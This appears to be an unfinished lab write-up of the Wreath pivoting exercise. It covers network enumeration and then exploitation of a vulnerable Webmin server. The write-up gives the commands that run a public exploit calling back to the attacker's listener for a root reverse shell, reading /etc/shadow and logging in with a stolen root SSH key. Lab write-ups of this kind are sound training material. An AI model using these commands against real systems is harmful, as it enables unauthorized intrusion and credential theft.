![image](https://github.com/user-attachments/assets/b5bd875b-fcc3-4286-afcc-a077677343fc)Wreath is designed as a learning resource for beginners with a primary focus on:

Pivoting
Working with the Empire C2 (Command and Control) framework
Simple Anti-Virus evasion techniques



# Brief
There are two machines on my home network that host projects and stuff I'm working on in my own time -- 
one of them has a webserver that's port forwarded, so that's your way in if you can find a vulnerability! It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. See if you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same difference.


# Enumeration 

As with any attack, we first begin with the enumeration phase
1. Fping: Using the command fping -agq 10.200.73.200/24 the network was ping to figure out what is in the network
The reult returned 3 Ip address,
  A. 10.200.73.1 - the gateway
  B. 10.200.73.200 - Which is the public facing server 
  C. 10.200.73.250 - unknown machine
![image](https://github.com/user-attachments/assets/1f8ce2fb-c9a3-4f5a-8f7b-7f3a33af18e1)



2. Nmap: This was used to further enumerate the Hosts found in the network
   A.  10.200.73.250 Host: This was scanned using nmap -T4 -sV -A 10.200.73.250  -oN scan.txt  and the result only showed
       i.  port 22 is actively running OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)

   ![image](https://github.com/user-attachments/assets/13b0b801-9bd8-4a18-aeeb-ca6942862a54)

  B. 10.200.73.200 Host: This was scanned using nmap -T4 -sV -p- 15000  -A 10.200.73.200  -oN scan.txt, and it returned the following
      i. Port 22 runnig OpenSSH 8.0 (protocol 2.0)
      ii. Port 80 running Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
      iii.Port  443   Apache/2.4.37 (centos) OpenSSL/1.1.1c
      ![image](https://github.com/user-attachments/assets/01be25df-0866-42bd-be16-3791b2237e54)
Going forward with the enumeration, the website was accessed, and was accessible only after adding the domain name resolved on the bowsrr when the IP addressed was input into the browser, into the /etc/hosts file
![image](https://github.com/user-attachments/assets/2c468504-6e52-4663-ba16-9dcba2c33952)
The website was subjcted to directory bruteforcing using  ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.200.73.200/FUZZ -fc 403
![image](https://github.com/user-attachments/assets/f65d363c-0923-42b2-8f3b-090c8273d094)

....
      iv. Port 9090 which showed closed status but is running zeus-admin
      v. Port 10000 running      MiniServ 1.890 (Webmin httpd): The website was accessed and it contained a login in page.  
![image](https://github.com/user-attachments/assets/8603471a-26cb-42e9-9b7e-d151c5ff90ba)


      vi. The operating system is linux CenSOS


# Exploitation

From the Enumeratin, it was discovered that the webserver on port 10000 of the  10.200.73.200 Host is running  MiniServ 1.890 (Webmin httpd)
A closer look at this version showed that it is vulnerable to RCE that gives a root shell CVE-2019–15107 
![image](https://github.com/user-attachments/assets/b454cbaf-d8cd-470c-8066-516afbdf71b8)

Using a publicly available python script and setting up a listner on port 2294, the RCE vulnerablity was exploited
./exploit.py  10.200.73.200 10000   10.50.66.4 2294           
screnshot of the script:
![image](https://github.com/user-attachments/assets/d845e147-f37a-42b0-9363-9b7067507d0d)
Screenshot of the listener getting root shell
![image](https://github.com/user-attachments/assets/07b17aab-1e5a-4daf-b85e-a084bffcf05e)


2. Password Enumeration
cat /etc/shadow was used to enumerate the root's password hash, then wreath's password
![image](https://github.com/user-attachments/assets/3c72cbaf-9513-4c9a-86f9-6550fc9c87ca)

![image](https://github.com/user-attachments/assets/88fd9c34-d863-4a8d-9816-04b9ea6a41f5)


3. Credential enumerations:
The root's home directory was enumerated, and an SSH key was discovered which is going to be useful for getting direct access into the server using the root's credentials without going through the RCE exploitation again.
![image](https://github.com/user-attachments/assets/76989e81-ed00-4c20-9b68-7cc2bce3e6f6)

The login was initiated using ssh root@10.200.97.200 -i key.txt  and the login was successful
![image](https://github.com/user-attachments/assets/2f0382a1-5064-44b3-86c5-e1e31387626b)

5. 
    





